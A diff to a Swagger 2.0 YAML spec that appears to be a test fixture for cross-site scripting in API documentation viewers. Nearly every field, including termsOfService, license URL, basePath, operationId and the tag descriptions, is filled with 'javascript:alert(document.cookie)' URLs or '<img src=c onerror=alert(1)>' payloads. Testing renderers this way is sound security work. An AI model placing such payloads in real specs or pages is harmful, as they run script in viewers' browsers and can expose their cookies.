@@ -1,10 +1,37 @@
-swagger: "2.0",
-info: 
-  title: "Swagger Sample App",
-  description: "Please to click Terms of service"
-  termsOfService: "javascript:alert(document.cookie)"
-  contact: 
-    name: "API Support",
-    url: "javascript:alert(document.cookie)",
-    email: "javascript:alert(document.cookie)"
-  version: "1.0.1"
+swagger: "2.0"
+info:
+  description: "This is a sample server Petstore server.  You can find out more about     Swagger at javascript:alert(document.cookie).      For this sample, you can use the api key `<img src=c onerror=alert(1)>` to test the authorization javascript:alert(document.cookie)    filters. " 
+  version: "1.0.0"
+  title: "'javascript:alert(document.cookie)"
+  termsOfService: "'javascript:alert(document.cookie)"
+  contact:
+    email: "alert@gmail.om"
+  license:
+    name: "'javascript:alert(document.cookie)"
+    url: "javascript:alert(document.cookie)"
+host: "petstore.swagger.io"
+basePath: "/javascript:alert(document.cookie)"
+tags:
+- name: "user"
+  description: "<img src=c onerror=alert(1)>"
+  externalDocs:
+    description: "<img src=c onerror=alert(1)>"
+    url: "javascript:alert(document.cookie)"
+schemes:
+- "https"
+- "http"
+paths:
+  /pet:
+    get:
+      tags:
+      - "pet"
+      summary: "Add a new pet to the store"
+      description: ""
+      operationId: "javascript:alert(document.cookie)"
+      consumes:
+      - "javascript:alert(document.cookie)"
+      - "application/xml"
+
+      responses:
+        405:
+          description: "Invalid input"
